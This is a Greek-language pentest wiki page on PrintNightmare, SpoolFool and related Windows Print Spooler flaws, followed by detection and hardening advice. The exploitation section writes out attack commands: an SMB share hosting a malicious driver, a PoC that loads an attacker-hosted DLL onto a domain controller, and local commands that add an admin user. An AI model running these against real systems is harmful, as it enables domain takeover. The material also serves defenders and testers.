# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> Το PrintNightmare είναι η συλλογική ονομασία μιας οικογένειας ευπαθειών στην υπηρεσία **Print Spooler** των Windows, οι οποίες επιτρέπουν **αυθαίρετη εκτέλεση κώδικα ως SYSTEM** και, όταν το spooler είναι προσβάσιμο μέσω RPC, **απομακρυσμένη εκτέλεση κώδικα (RCE) σε domain controllers και file servers**. Τα CVE που έχουν εκμεταλλευτεί περισσότερο είναι τα **CVE-2021-1675** (αρχικά ταξινομημένο ως LPE) και **CVE-2021-34527** (πλήρες RCE). Μεταγενέστερα ζητήματα, όπως τα **CVE-2021-34481 (“Point & Print”)** και **CVE-2022-21999 (“SpoolFool”)**, αποδεικνύουν ότι η επιφάνεια επίθεσης απέχει ακόμη πολύ από το να έχει κλείσει.

Αν αναζητάτε **authentication coercion / relay** μέσω του spooler και όχι **driver-based RCE/LPE**, δείτε [αυτήν τη σελίδα σχετικά με την abuse του printer coercion](printers-spooler-service-abuse.md). Αυτή η σελίδα επικεντρώνεται στη **φόρτωση drivers / DLLs ως SYSTEM**.

---

## 1. Ευάλωτα components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Έγινε patch στο CU του Ιουνίου 2021, αλλά παρακάμφθηκε μέσω του CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|Το `AddPrinterDriverEx` επιτρέπει σε authenticated users να φορτώσουν ένα driver DLL από remote share· μετά τον Αύγουστο του 2021 αυτό συνήθως απαιτεί αποδυναμωμένες Point & Print policies|
|2021|CVE-2021-34481|“Point & Print”|LPE|Εγκατάσταση unsigned driver από non-admin users|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Αυθαίρετη δημιουργία directory → DLL planting – λειτουργεί μετά τα patches του 2021|

Όλα κάνουν abuse σε μία από τις **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ή στις trust relationships μέσα στο **Point & Print**.

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

Ένας authenticated αλλά **non-privileged** domain user μπορεί να εκτελέσει αυθαίρετα DLLs ως **NT AUTHORITY\SYSTEM** σε έναν remote spooler (συχνά τον DC), ως εξής:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Δημοφιλή PoCs περιλαμβάνουν τα **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) και τα modules `misc::printnightmare / lsa::addsid` του Benjamin Delpy στο **mimikatz**.

### 2.2 Τοπική κλιμάκωση προνομίων (οποιαδήποτε υποστηριζόμενη έκδοση Windows, 2021-2024)

Το ίδιο API μπορεί να κληθεί **τοπικά** για τη φόρτωση ενός driver από το `C:\Windows\System32\spool\drivers\x64\3\` και την απόκτηση δικαιωμάτων SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Σύγχρονο triage σε patched hosts

Σε ένα πλήρως ενημερωμένο host, τα public PrintNightmare PoCs συχνά αποτυγχάνουν, επειδή τα Windows χρησιμοποιούν πλέον ως προεπιλογή την εγκατάσταση printer driver μόνο από **administrators** (`RestrictDriverInstallationToAdministrators=1` από τις 10 Αυγούστου 2021). Πριν εκτελέσετε ένα exploit εναντίον ενός target, ελέγξτε πρώτα αν το περιβάλλον έχει αναιρέσει αυτή την αλλαγή ασφαλείας για legacy printer deployments:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Οι δύο πιο ενδιαφέρουσες αδύναμες τιμές είναι συνήθως:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Από Linux, επιβεβαιώστε γρήγορα ότι ο στόχος εκθέτει τις σχετικές διεπαφές print RPC πριν εκτελέσετε ένα PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Ορισμένα νεότερα δημόσια εργαλεία σάς προσφέρουν επίσης μια ασφαλέστερη ροή εργασίας **check/list** πριν από την αποστολή ενός DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Εάν λάβετε `RPC_E_ACCESS_DENIED` (`0x8001011b`) ως low-privileged user, συνήθως βλέπετε την προεπιλεγμένη συμπεριφορά μετά το 2021 και όχι αποτυχία transport.

> Στα Windows 11 22H2+ και σε νεότερα client builds, το remote printing χρησιμοποιεί από προεπιλογή **RPC over TCP**, ενώ το **RPC over named pipes** (`\PIPE\spoolss`) είναι απενεργοποιημένο, εκτός εάν ενεργοποιηθεί ξανά ρητά. Ορισμένα παλαιότερα PoCs και lab notes εξακολουθούν να θεωρούν ότι το named pipe είναι προσβάσιμο.

### 2.4 Κατάχρηση του Package Point & Print σε “patched” δίκτυα

Πολλά enterprise περιβάλλοντα παρέμειναν **ευάλωτα λόγω policy** μετά τα αρχικά patches του 2021, επειδή οι ροές εργασίας του helpdesk ή του print server εξακολουθούσαν να απαιτούν από non-admin users να εγκαθιστούν ή να ενημερώνουν drivers. Στην πράξη, το offensive playbook γίνεται:

- Εάν τα security prompts είναι πλήρως απενεργοποιημένα, το **classic arbitrary-DLL PrintNightmare** εξακολουθεί να είναι η συντομότερη διαδρομή.
- Εάν είναι ενεργοποιημένο το `Only use Package Point and Print`, συνήθως χρειάζεται pivot σε διαδρομή **signed package-aware driver** αντί για raw DLL drop.
- Η έρευνα του 2024 έδειξε ότι το **`Package Point and Print - Approved servers` δεν αποτελεί από μόνο του hard trust boundary**: εάν ένας attacker μπορεί να κάνει spoof ή hijack το name resolution για έναν εγκεκριμένο print server, τα victims μπορούν και πάλι να ανακατευθυνθούν σε έναν malicious server που ικανοποιεί τους policy checks.
- Ακόμη και ο συνδυασμός UNC hardening με forced RPC-over-SMB μπορεί να είναι εύθραυστος, επειδή οι σύγχρονοι clients μπορεί να κάνουν **fallback σε RPC over TCP**.

Γι’ αυτό η σύγχρονη exploitation τύπου PrintNightmare αφορά συχνά περισσότερο την **κατάχρηση enterprise printer deployment policy** παρά την αναπαραγωγή του αρχικού PoC του 2021 χωρίς αλλαγές.

### 2.5 SpoolFool (CVE-2022-21999) – παράκαμψη των fixes του 2021

Τα patches της Microsoft του 2021 απέκλεισαν το remote driver loading, αλλά **δεν ενίσχυσαν τα directory permissions**. Το SpoolFool καταχράται την παράμετρο `SpoolDirectory` για να δημιουργήσει έναν arbitrary directory κάτω από το `C:\Windows\System32\spool\drivers\`, τοποθετεί ένα payload DLL και αναγκάζει τον spooler να το φορτώσει:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Το exploit λειτουργεί σε πλήρως patched Windows 7 → Windows 11 και Server 2012R2 → 2022 πριν από τα updates του Φεβρουαρίου 2022

---

## 3. Detection & hunting

* **PrintService logs** – ενεργοποιήστε το κανάλι *Microsoft-Windows-PrintService/Operational* και παρακολουθείτε το **Event ID 316** (driver που προστέθηκε/ενημερώθηκε, συνήθως περιλαμβάνει τα ονόματα των DLL) τόσο σε επιτυχημένες όσο και σε αποτυχημένες προσπάθειες. Συνδυάστε το με τα **Event ID 808/811** για ύποπτες αποτυχίες φόρτωσης module/driver του spooler.
* **Sysmon** – `Event ID 7` (Image loaded) ή `11/23` (File write/delete) μέσα στο `C:\Windows\System32\spool\drivers\*` όταν η parent process είναι η **spoolsv.exe**.
* **Process lineage** – δημιουργήστε alert κάθε φορά που η **spoolsv.exe** εκκινεί `cmd.exe`, `rundll32.exe`, PowerShell ή οποιαδήποτε μη αναμενόμενη unsigned child process.
* **Network telemetry** – μη αναμενόμενα SMB fetches από τη **spoolsv.exe** προς shares που ελέγχονται από attacker ή ασυνήθιστη printer RPC κίνηση από servers που δεν θα έπρεπε να λειτουργούν ως print servers αποτελούν ενδείξεις υψηλής αξίας.

## 4. Mitigation & hardening

1. **Κάντε patch!** – Εφαρμόστε το πιο πρόσφατο cumulative update σε κάθε Windows host όπου είναι εγκατεστημένη η υπηρεσία Print Spooler.
2. **Απενεργοποιήστε τον spooler όπου δεν απαιτείται**, ειδικά στους Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Αποκλείστε τις remote connections** ενώ εξακολουθείτε να επιτρέπετε το local printing – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Διατηρήστε το Point & Print μόνο για administrators** ορίζοντας:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Λεπτομερείς οδηγίες στο Microsoft KB5005652
5. Αν οι business requirements επιβάλλουν `RestrictDriverInstallationToAdministrators=0`, αντιμετωπίστε κάθε άλλη printer policy ως **μερικό mitigation בלבד**. Τουλάχιστον, προτιμήστε **package-aware drivers**, ενεργοποιήστε το **Only use Package Point and Print** και περιορίστε το **Package Point and Print - Approved servers** σε συγκεκριμένους in-forest print servers.
6. **Μην κάνετε rollback το printer RPC privacy** μόνο και μόνο για να διορθώσετε broken printer mappings. Τα environments που ορίζουν `RpcAuthnLevelPrivacyEnabled=0` αναιρούν το hardening που προστέθηκε για το **CVE-2021-1678** και συνήθως απαιτούν επιπλέον έλεγχο κατά τη διάρκεια ενός engagement.

---

## 5. Related research / tools

* modules του mimikatz `printnightmare` (https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standard Impacket implementation με modes `-check`, `-list` και `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper με ενσωματωμένο SMB delivery, υποστήριξη multi-target και modes `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – abuse bring-your-own-vulnerable-printer-driver μέσω package Point & Print
* SpoolFool exploit & write-up
* 0patch micropatches για το SpoolFool και άλλα bugs του spooler

Αν θέλετε να **εξαναγκάσετε authentication** μέσω του spooler αντί να φορτώσετε driver, μεταβείτε στο [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## References

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
